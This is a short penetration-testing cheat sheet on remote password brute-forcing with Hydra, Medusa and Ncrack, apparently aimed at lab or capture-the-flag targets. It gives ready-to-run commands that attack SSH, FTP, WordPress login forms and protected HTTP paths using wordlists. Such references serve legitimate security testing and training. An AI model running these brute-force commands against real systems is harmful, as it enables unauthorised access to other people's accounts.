# Remote Password Cracking

These examples are suitable for a **quick brute-force attempt**. More sophisticated and efficient attacks can be performed by reading the manual and tuning options like timing, parallel connections, service-specific parameters, and authentication methods.

## 1. Hydra

`hydra -U <module>` shows the available options. (eg. `hydra -U http-post-form`)

```bash
hydra [options] [server] [service] [options]
hydra -l root -P passwords.txt [server] [service]
```

* **`-L [FILE]`** -> username wordlist.
* **`-l [USERNAME]`** -> single username.
* **`-P [FILE]`** -> password wordlist.
* **`-p [PASSWORD]`** -> single password.
* **`-C FILE`** -> uses colon seperated format from a file (USERNAME:PASSWORD)
* **`-u`** -> cycle usernames for a password.
* **`-s PORT`** -> Specify the port number if the service is running on a non-standard port.
* **`-t NUM`** -> run TASKS number of connects in parallel (default: 16)
* **`-f`** -> stops after finding the first set of cresentials.
* **`-o FILE`** -> writes found credential to a file.

### Examples

```bash
hydra -l root -P passwords.txt 10.10.10.6 ssh
hydra -l root -P passwords.txt 10.10.10.6 ftp

# http-post-form

hydra -L users.txt -p blah 10.10.10.7 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
hydra -l Elliot -P passwords.txt 10.10.10.7  http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
```

---

## 2. Medusa

```bash
medusa -u USER -P wordlist.txt -h 192.168.1.1 -M http -m DIR:/index.html
```

* **`-M http`** -> specify HTTP module
* **`-u USER`** -> single username *(alternative: `-U users.txt`)*
* **`-P wordlist.txt`** -> password list *(alternative: `-p PASSWORD`)*
* **`-h 192.168.1.1`** -> target host/IP
* **`-m DIR:/index.html`** -> specify protected HTTP directory/path

**Note:** Medusa is modular and fast; behavior depends heavily on the selected module and `-m` options (check the manual for module-specific parameters).

`medusa -d` -> Lists all available modules (supported services)

---

## 3. Ncrack

```bash
ncrack -m http -u USER -P wordlist.txt http://192.168.1.1 -g path=/index.html -f
```

* **`-m http`** -> specify HTTP module (alternative: `http://IP`)
* **`-u USER`** -> single username (alternative: `-U users.txt`)
* **`-P wordlist.txt`** -> password list (alternative: `-p PASSWORD`)
* **`http://192.168.1.1`** -> target IP and service
* **`-g path=/index.html`** -> specify authentication path
* **`-f`** -> stop after first successful login

---
